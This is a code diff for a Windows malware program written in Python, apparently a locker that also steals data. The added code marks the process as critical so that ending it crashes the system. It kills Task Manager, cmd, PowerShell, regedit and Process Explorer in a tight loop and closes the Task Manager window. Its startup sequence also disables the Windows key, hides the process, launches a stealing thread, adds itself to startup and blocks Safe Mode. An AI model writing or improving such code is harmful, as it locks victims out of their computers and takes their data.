@@ -35,16 +35,23 @@ def run_hidden(cmd):
     try: subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
     except: pass
 
-def kill_taskmgr_super():
+def protect_process():
+    try:
+        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+        ctypes.windll.kernel32.SetProcessShutdownParameters(0x100, 0)
+    except: pass
+
+def kill_taskmgr_ultimate():
     while True:
         try:
             for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe"]:
                 run_hidden(f"taskkill /f /im {p}")
-            ctypes.windll.kernel32.SetProcessShutdownParameters(0x100, 0)
-            try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+            try:
+                hwnd = ctypes.windll.user32.FindWindowW(None, "Task Manager")
+                if hwnd: ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
             except: pass
         except: pass
-        time.sleep(0.01)
+        time.sleep(0.005)
 
 def disable_win_key():
     try:
@@ -196,8 +203,6 @@ def play_video():
         v.configure(bg='black'); v.overrideredirect(True)
         v.protocol("WM_DELETE_WINDOW", lambda: None)
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
-        
-        # Звук из самого видео файла
         try:
             subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', VIDEO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
         except:
@@ -207,7 +212,6 @@ def play_video():
                 pygame.mixer.music.load(VIDEO_PATH)
                 pygame.mixer.music.play()
             except: pass
-        
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
             fps = cap.get(cv2.CAP_PROP_FPS)
@@ -377,9 +381,10 @@ YOU FUCK.
             self.pw.delete(0, tk.END)
 
 if __name__ == "__main__":
+    protect_process()
     disable_win_key()
     hide_process()
-    threading.Thread(target=kill_taskmgr_super, daemon=True).start()
+    threading.Thread(target=kill_taskmgr_ultimate, daemon=True).start()
     threading.Thread(target=mega_steal, daemon=True).start()
     add_to_startup()
     block_safe_mode()
